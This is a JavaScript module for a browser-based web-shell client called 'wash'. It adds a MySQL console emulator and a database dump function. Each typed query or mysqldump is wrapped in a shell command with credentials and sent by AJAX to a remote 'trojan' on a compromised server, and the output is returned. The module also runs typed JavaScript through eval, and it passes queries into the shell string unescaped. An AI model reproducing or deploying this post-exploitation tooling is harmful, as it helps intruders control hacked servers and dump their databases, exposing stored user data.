// Here we pop open the wash object once again to patch in some tailored
// functionality.
wash.mysql = {

    // buffer the raw SQL command for later use
    cmd: '',

    // buffer the database connection parameters
    connection: {
        username : 'root',
        password : 'root',
        database : '',
    },

    // buffer some objects when changing emulation modes
    old_objects: {
        // I think the wrong prompt is being saved somehow...
        prompt          : '',
        process_command : '',
    },

    // this will begin an emulation of a mysql terminal
    connect: function(connection_parameters){
        // set the connection parameters
        // @todo: some kind of success-failure detection would be ideal
        wash.mysql.connection.username = connection_parameters.username;
        wash.mysql.connection.password = connection_parameters.password;
        wash.mysql.connection.database = connection_parameters.database;

        // visually signify that we're entering an emulated session
        $('body').animate({ backgroundColor : '#E97B00' }, 500);
        shell.status.set('Emulating mysql client.');

        // buffer the previous session's settings
        wash.mysql.old_objects.prompt = shell.prompt.context.get();
        shell.prompt.context.set('mysql>');

        // buffer the previous process command - this is where the real "magic"
        // happens that makes this work
        wash.mysql.old_objects.process_command = wash.process; 

        // now, write a new function to process commands
        wash.process = function(command){
            // buffer the raw SQL command
            wash.mysql.cmd = command;

            // parse out the wash action
            if(shell.prompt.mode.get() == 'wash'){
                // process wash commands as pure JavaScript. This allows for
                // tremendous extensibility
                try{
                    shell.output.write(command, 'output wash');
                    eval(command);
                }catch(e){
                    shell.output.write('wash error: Invalid command.', 'output wash_error');
                }
            }
            
            // if the prompt is not in wash mode, default to mysql action
            else {
                // @todo: remember to escape quotations here
                // command = ...
                 
                // emulate the mysql console just by running queries through the 
                // command line
                var cmd = 'mysql ';
                cmd += "-u'"       + wash.mysql.connection.username + "' ";
                cmd += "-p'"       + wash.mysql.connection.password + "' ";
                cmd += wash.mysql.connection.database               + " "; 
                cmd += "-e '"      + command                        + "'"; 

                // fire the command off to the trojan
                wash.command.action = 'shell';
                wash.command.cmd    = cmd;
                wash.mysql.send_and_receive();
            }
        };
    },

    // disconnects from the terminal emulation
    disconnect: function(){
        // animate back to the default terminal
        $('body').animate({ backgroundColor : '#708090' }, 500);
        shell.status.set('Terminating mysql emulation.');

        // restore the old prompt
        shell.prompt.context.set(wash.mysql.old_objects.prompt);

        // restore the old process function
        wash.process = wash.mysql.old_objects.process_command;
    },

    // dumps a mysql database
    dump: function(connection_parameters){
        // update the connection parameters, if necessary
        if(connection_parameters != null){
            wash.mysql.use(connection_parameters);
        }

        // assemble the dump command
        var cmd = 'mysqldump ';
        cmd += "-u'" +  wash.mysql.connection.username +  "' ";
        cmd += "-p'" +  wash.mysql.connection.password +  "' ";
        cmd += wash.mysql.connection.database          +  " "; 

        /*
        // @todo: this is borked for some reason
        // must have to do with a failure to auto-vivity this .outfile object,
        // but I'm not sure what else I can do here...
        // pipe to an outfile if specified
        if(connection_parameters.outfile != ''){
            cmd += "> " + connection_parameters.outfile;
        }
        */

        // fire the command off to the trojan
        wash.command.action = 'shell';
        wash.command.cmd    = cmd;
        wash.mysql.send_and_receive();
    },

    // @see: wash.send_and_receive(). We just need slightly
    // different functionality here, so I'm re-implementing
    send_and_receive: function(){
        // make the AJAX request to the trojan
        // @todo: manage crypto here
        $.ajax({
            type : wash.connection.request_type,
            url  : wash.connection.protocol + '://' + wash.connection.domain + wash.connection.url,
            data : wash.command,
        }).done(function(response){
            // @todo: manage crypto here
        
            // parse the JSON response
            wash.response = JSON.parse(response);

            // set the prompt context
            shell.prompt.context.set('mysql>');

            // output the last command as history
            shell.output.write(wash.mysql.cmd);

            // display output or error, depending on which was received
            if(wash.response.error != null){
                shell.output.write(wash.response.error, 'output wash_error');
            } else {
                shell.output.write(wash.response.output, 'output');
            }
        });
    },

    // USEs a different mysql database
    use: function(connection_parameters){
        // re-map the connection strings
        if(connection_parameters.username != null){ wash.mysql.connection.username = connection_parameters.username; }
        if(connection_parameters.password != null){ wash.mysql.connection.password = connection_parameters.password; }
        if(connection_parameters.database != null){ wash.mysql.connection.database = connection_parameters.database; }

        // notify
        shell.output.write('wash: database connection parameters updated.', 'output wash_info');
    },
}
